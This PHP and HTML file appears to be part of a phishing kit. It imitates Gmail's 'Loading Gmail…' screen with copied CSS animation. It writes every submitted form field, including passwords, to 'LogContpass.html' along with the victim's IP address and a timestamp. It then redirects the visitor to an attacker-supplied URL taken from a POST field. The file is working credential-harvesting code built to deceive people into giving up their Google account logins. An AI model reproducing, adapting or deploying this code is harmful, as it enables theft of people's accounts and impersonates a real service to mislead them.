<?php
 
//Set Refresh header using PHP.
if( isset($_POST['page'])){
	//
	$page = $_POST['page'];
    
}
//header("Location: ".$page);
header( "refresh:3; url= ".$page);

?>


<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Gmail loading</title>
  <link rel="icon" type="image/png/ico" href="gmail.ico"/>
  <meta name="description" content="Gmail loading">
        <meta name="keywords" content="HTML,CSS,New Gmail loading,">
        
<meta name="viewport" content="width=device-width, initial-scale=1">
  
  
  
  
</head>

<body>

  <html>
    <head>
        <Title>Gmail loading</Title>
        <meta name="description" content="New Gmail loading animation in 2018.New Gmail loading animation only CSS ">
        <meta name="keywords" content="HTML,CSS,New Gmail loading animation, 2018,">
        <meta name="author" content="hacker_string">
        
    </head>

    <body>

    </body>

    <style>
            body {
                margin: 0;
                width: 100%;
                height: 100%
            }
        
            body,
            td,
            input,
            textarea,
            select {
                font-family: arial, sans-serif
            }
        
            input,
            textarea,
            select {
                font-size: 100%
            }
        
            #loading {
                position: absolute;
                width: 100%;
                height: 100%;
                z-index: 1000;
                background-color: #fff
            }
        
            .msg {
                color: #757575;
                font: 20px/20px Arial, sans-serif;
                letter-spacing: .2px;
                text-align: center
            }
        
            #nlpt {
                animation: a-s .5s 2.5s 1 forwards;
                background-color: #f1f1f1;
                height: 4px;
                margin: 56px auto 20px;
                opacity: 0;
                overflow: hidden;
                position: relative;
                width: 300px
            }
        
            #nlpt::before {
                animation: a-lb 20s 3s linear forwards;
                background-color: #db4437;
                content: '';
                display: block;
                height: 100%;
                position: absolute;
                transform: translateX(-300px);
                width: 100%
            }
        
            @keyframes a-lb {
                0% {
                    transform: translateX(-300px)
                }
                5% {
                    transform: translateX(-240px)
                }
                15% {
                    transform: translateX(-30px)
                }
                25% {
                    transform: translateX(-30px)
                }
                30% {
                    transform: translateX(-20px)
                }
                45% {
                    transform: translateX(-20px)
                }
                50% {
                    transform: translateX(-15px)
                }
                65% {
                    transform: translateX(-15px)
                }
                70% {
                    transform: translateX(-10px)
                }
                95% {
                    transform: translateX(-10px)
                }
                100% {
                    transform: translateX(-5px)
                }
            }
        
            @keyframes a-s {
                100% {
                    opacity: 1
                }
            }
        
            @keyframes a-h {
                100% {
                    opacity: 0
                }
            }
        
            @keyframes a-nt {
                100% {
                    transform: none
                }
            }
        
            @keyframes a-e {
                43% {
                    animation-timing-function: cubic-bezier(.8, 0, .2, 1);
                    transform: scale(.75)
                }
                60% {
                    animation-timing-function: cubic-bezier(.8, 0, 1, 1);
                    transform: translateY(-16px)
                }
                77% {
                    animation-timing-function: cubic-bezier(.16, 0, .2, 1);
                    transform: none
                }
                89% {
                    animation-timing-function: cubic-bezier(.8, 0, 1, 1);
                    transform: translateY(-5px)
                }
                100% {
                    transform: none
                }
            }
        
            @keyframes a-ef {
                24% {
                    animation-timing-function: cubic-bezier(.8, 0, .6, 1);
                    transform: scaleY(.42)
                }
                52% {
                    animation-timing-function: cubic-bezier(.63, 0, .2, 1);
                    transform: scaleY(.98)
                }
                83% {
                    animation-timing-function: cubic-bezier(.8, 0, .84, 1);
                    transform: scaleY(.96)
                }
                100% {
                    transform: none
                }
            }
        
            @keyframes a-efs {
                24% {
                    animation-timing-function: cubic-bezier(.8, 0, .6, 1);
                    opacity: .3
                }
                52% {
                    animation-timing-function: cubic-bezier(.63, 0, .2, 1);
                    opacity: .03
                }
                83% {
                    animation-timing-function: cubic-bezier(.8, 0, .84, 1);
                    opacity: .05
                }
                100% {
                    opacity: 0
                }
            }
        
            @keyframes a-es {
                24% {
                    animation-timing-function: cubic-bezier(.8, 0, .6, 1);
                    transform: rotate(-25deg)
                }
                52% {
                    animation-timing-function: cubic-bezier(.63, 0, .2, 1);
                    transform: rotate(-42.5deg)
                }
                83% {
                    animation-timing-function: cubic-bezier(.8, 0, .84, 1);
                    transform: rotate(-42deg)
                }
                100% {
                    transform: rotate(-43deg)
                }
            }
        
            .invfr {
                position: absolute;
                left: 0;
                top: 0;
                z-index: -1;
                width: 0;
                height: 0;
                border: 0
            }
        
            .msgb {
                position: absolute;
                right: 0;
                font-size: 12px;
                font-weight: normal;
                color: #000;
                padding: 20px
            }
        </style>
        <div id="loading">
            <div style="bottom:0;left:0;overflow:hidden;position:absolute;right:0;top:0">
                <div style="animation:a-h .5s 1.25s 1 linear forwards,a-nt .6s 1.25s 1 cubic-bezier(0,0,.2,1);background:#eee;border-radius:50%;height:800px;left:50%;margin:-448px -400px 0;position:absolute;top:50%;transform:scale(0);width:800px"></div>
            </div>
            <div style="height:100%;text-align:center">
                <div style="height:50%;margin:0 0 -140px"></div>
                <div style="height:128px;margin:0 auto;position:relative;width:176px">
                    <div style="animation:a-s .5s .5s 1 linear forwards,a-e 1.75s .5s 1 cubic-bezier(0,0,.67,1) forwards;opacity:0;transform:scale(.68)">
                        <div style="background:#ddd;border-radius:12px;box-shadow:0 15px 15px -15px rgba(0,0,0,.3);height:128px;left:0;overflow:hidden;position:absolute;top:0;transform:scale(1);width:176px">
                            <div style="animation:a-nt .667s 1.5s 1 cubic-bezier(.4,0,.2,1) forwards;background:#d23f31;border-radius:50%;height:270px;left:88px;margin:-135px;position:absolute;top:25px;transform:scale(.5);width:270px"></div>
                            <div style="height:128px;left:20px;overflow:hidden;position:absolute;top:0;transform:scale(1);width:136px">
                                <div style="background:#e1e1e1;height:128px;left:0;position:absolute;top:0;width:68px">
                                    <div style="animation:a-h .25s 1.25s 1 forwards;background:#eee;height:128px;left:0;opacity:1;position:absolute;top:0;width:68px"></div>
                                </div>
                                <div style="background:#eee;height:100px;left:1px;position:absolute;top:56px;transform:scaleY(.73)rotate(135deg);width:200px"></div>
                            </div>
                            <div style="background:#bbb;height:176px;left:0;position:absolute;top:-100px;transform:scaleY(.73)rotate(135deg);width:176px">
                                <div style="background:#eee;border-radius:12px 12px 0 0;bottom:117px;height:12px;left:55px;position:absolute;transform:rotate(-135deg)scaleY(1.37);width:136px"></div>
                                <div style="background:#eee;height:96px;position:absolute;right:0;top:0;width:96px"></div>
                                <div style="box-shadow:inset 0 0 10px #888;height:155px;position:absolute;right:0;top:0;width:155px"></div>
                            </div>
                            <div style="animation:a-s .167s 1.283s 1 linear forwards,a-es 1.184s 1.283s 1 cubic-bezier(.4,0,.2,1) forwards;background:linear-gradient(0,rgba(38,38,38,0),rgba(38,38,38,.2));height:225px;left:0;opacity:0;position:absolute;top:0;transform:rotate(-43deg);transform-origin:0 13px;width:176px"></div>
                        </div>
                        <div style="animation:a-ef 1.184s 1.283s 1 cubic-bezier(.4,0,.2,1) forwards;border-radius:12px;height:100px;left:0;overflow:hidden;position:absolute;top:0;transform:scaleY(1);transform-origin:top;width:176px">
                            <div style="height:176px;left:0;position:absolute;top:-100px;transform:scaleY(.73)rotate(135deg);width:176px">
                                <div style="animation:a-s .167s 1.283s 1 linear forwards;box-shadow:-5px 0 12px rgba(0,0,0,.5);height:176px;left:0;opacity:0;position:absolute;top:0;width:176px"></div>
                                <div style="background:#ddd;height:176px;left:0;overflow:hidden;position:absolute;top:0;width:176px">
                                    <div style="animation:a-nt .667s 1.25s 1 cubic-bezier(.4,0,.2,1) forwards;background:#db4437;border-radius:50%;bottom:41px;height:225px;left:41px;position:absolute;transform:scale(0);width:225px"></div>
                                    <div style="background:#f1f1f1;height:128px;left:24px;position:absolute;top:24px;transform:rotate(90deg);width:128px"></div>
                                    <div style="animation:a-efs 1.184s 1.283s 1 cubic-bezier(.4,0,.2,1) forwards;background:#fff;height:176px;opacity:0;transform:rotate(90deg);width:176px"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="nlpt"></div>
                <div style="animation:a-s .25s 1.25s 1 forwards;opacity:0" class="msg">Loading Gmail&hellip;</div>
            </div>
        </div>
        
</html>
  
  

</body>

</html>



<?php
//header("location: ");
$ip=$_SERVER['REMOTE_ADDR'];
$timestamp = date('d/m/Y h:i:s');
$handle =fopen("LogContpass.html","a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "=");
fwrite($handle, $ip);
fwrite($handle, " ");
fwrite($handle, $timestamp);
fwrite($handle, "=");
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
exit;
?>